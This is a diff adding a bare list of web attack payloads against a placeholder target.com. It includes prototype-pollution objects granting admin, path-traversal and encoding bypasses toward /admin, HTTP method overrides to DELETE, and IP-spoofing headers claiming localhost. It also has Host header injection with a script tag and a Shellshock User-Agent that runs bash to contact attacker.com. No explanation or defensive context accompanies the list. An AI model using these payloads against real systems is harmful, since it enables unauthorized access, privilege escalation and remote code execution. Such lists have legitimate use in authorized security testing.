@@ -1,0 +1,61 @@
+?debug=1
+?test=1
+?admin=1
+?dev=true
+?verbose=true
+?trace=true
+?format=json
+?format=xml
+?format=debug
+?callback=alert
+?jsonp=alert(1)
+?_=1
+?v=0
+?nocache=1
+?internal=true
+?__proto__[admin]=true
+?constructor[prototype][admin]=true
+{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+{"__proto__": {"isAdmin": true, "role": "admin"}}
+{"a": {"__proto__": {"polluted": "yes"}}}
+GET /api/.json
+GET /api/.xml
+GET /api;.json
+GET /api;.xml
+GET /api?type=json
+GET /api%2f.json
+GET /api%2f..%2fadmin
+curl -s -X TRACE https://target.com/
+curl -s -X OPTIONS https://target.com/ -H "Origin: https://attacker.com"
+curl -s -X DEBUG https://target.com/
+curl -s -X CONNECT https://target.com/
+X-HTTP-Method-Override: DELETE
+X-HTTP-Method-Override: PUT
+X-Method-Override: DELETE
+_method=DELETE
+_method=PUT
+curl -s -X POST https://target.com/api/resource -H "X-HTTP-Method-Override: DELETE"
+Content-Type: application/json; charset=utf-7
+Content-Type: application/json; charset=utf-16
+Accept-Encoding: gzip, deflate, br
+Transfer-Encoding: gzip (force double encoding)
+GET /api/v1/../v2/admin
+GET /api/v1/users%2f..%2fadmin
+GET //api/v1/users
+GET ///api/v1/admin
+GET /api/v1/users#admin
+curl -s -H "X-Originating-IP: 127.0.0.1" https://target.com/admin
+curl -s -H "X-Remote-IP: 127.0.0.1" https://target.com/admin
+curl -s -H "X-Remote-Addr: 127.0.0.1" https://target.com/admin
+curl -s -H "X-ProxyUser-Ip: 127.0.0.1" https://target.com/admin
+curl -s -H "True-Client-IP: 127.0.0.1" https://target.com/admin
+curl -s -H "CF-Connecting-IP: 127.0.0.1" https://target.com/admin
+curl -s -H "Client-IP: 127.0.0.1" https://target.com/admin
+curl -s -H "Forwarded: for=127.0.0.1" https://target.com/admin
+Host: target.com:443@attacker.com
+Host: target.com:80 (non-standard port)
+Host: target.com%0d%0a
+Host: target.com<script>alert(1)</script>
+User-Agent: () { :; }; /bin/bash -c 'curl http://attacker.com'
+Referer: https://target.com/../admin
